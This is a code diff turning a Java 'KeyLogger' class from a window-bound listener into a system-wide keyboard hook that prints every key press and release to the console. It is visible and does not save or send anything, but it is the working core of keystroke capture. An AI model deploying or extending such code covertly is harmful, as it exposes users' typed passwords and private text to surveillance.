@@ -1,46 +1,50 @@
-import javax.swing.*;
-import java.awt.event.KeyEvent;
-import java.awt.event.KeyListener;
-import java.io.File;
-import java.util.HashMap;
+import lc.kra.system.keyboard.GlobalKeyboardHook;
+import lc.kra.system.keyboard.event.GlobalKeyAdapter;
+import lc.kra.system.keyboard.event.GlobalKeyEvent;
 
-//FIXME JFrame을 쓰면 해당 윈도우가 활성화 된 경우만 로그 수집
-//FIXME 비정상 종료는 finalize로 대응 가능하지만, 정상종료에 해당되는 hook 필요
-public class KeyLogger extends JFrame implements KeyListener {
-//    File 객체
-    private File file;
-//    입력 기록(순서 상관x)
-    private HashMap<Integer, Integer> map;
+import java.util.Map;
+
+public class KeyLogger {
+    private static boolean run = true;
+    private GlobalKeyboardHook keyboardHook;
 
     public KeyLogger() {
 //        File 객체 open
 //        버퍼? 버퍼쓸꺼면 죽기전에 버퍼에 있는거 File에 flush하고 close
-        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
-        this.setSize(500, 500);
-        this.setLayout(null);
-        this.setVisible(true);
-        this.addKeyListener(this);
+        // Might throw a UnsatisfiedLinkError if the native library fails to load or a RuntimeException if hooking fails
+        keyboardHook = new GlobalKeyboardHook(true); // Use false here to switch to hook instead of raw input
+
+        System.out.println("Global keyboard hook successfully started, press [escape] key to shutdown. Connected keyboards:");
+
+        for (Map.Entry<Long, String> keyboard : GlobalKeyboardHook.listKeyboards().entrySet()) {
+            System.out.format("%d: %s\n", keyboard.getKey(), keyboard.getValue());
+        }
+
+        keyboardHook.addKeyListener(new GlobalKeyAdapter() {
+
+            @Override
+            public void keyPressed(GlobalKeyEvent event) {
+                System.out.println(event);
+                if (event.getVirtualKeyCode() == GlobalKeyEvent.VK_ESCAPE) {
+                    run = false;
+                }
+            }
+
+            @Override
+            public void keyReleased(GlobalKeyEvent event) {
+                System.out.println(event);
+            }
+        });
+
+        try {
+            while (run) {
+                Thread.sleep(128);
+            }
+        } catch (InterruptedException e) {
+            //Do nothing
+        } finally {
+            keyboardHook.shutdownHook();
+        }
     }
 
-    @Override
-    protected void finalize() throws Throwable {
-        System.out.println("finalize");
-//        map
-        super.finalize();
-    }
-
-    @Override
-    public void keyTyped(KeyEvent e) {
-
-    }
-
-    @Override
-    public void keyPressed(KeyEvent e) {
-
-    }
-
-    @Override
-    public void keyReleased(KeyEvent e) {
-        System.out.println("keyReleased::e.getKeyCode(): " + e.getKeyCode());
-    }
 }
